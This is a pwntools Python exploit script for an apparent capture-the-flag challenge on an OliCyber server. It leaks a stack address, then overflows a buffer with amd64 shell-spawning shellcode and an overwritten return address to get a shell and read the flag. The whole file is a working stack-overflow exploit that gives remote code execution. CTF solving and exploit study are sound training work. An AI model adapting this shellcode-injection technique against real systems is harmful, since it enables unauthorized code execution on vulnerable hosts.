from pwn import *

r = remote("vault.challs.olicyber.it", 10006)

r.recvuntil(b'>')

r.sendline(b'1')

r.recvline()
payload = b'A' * 72 + b'\0' * 8
r.sendline(payload)
r.recvuntil('in ')
address = r.recvuntil(b'!', True)
address = int(address.decode(), 16)

r.recvuntil(b'>')

r.sendline('1')
r.recvline()

payload = asm(shellcraft.amd64.linux.sh(), arch="amd64") + b'A' * 24 + b'\0' * 8 # Stack
payload += b'A' * 8 # RBP
payload += p64(address) # RET
r.sendline(payload)

r.recvuntil(b'>')
r.sendline(b'3')

r.sendline(b'cat flag')

r.interactive()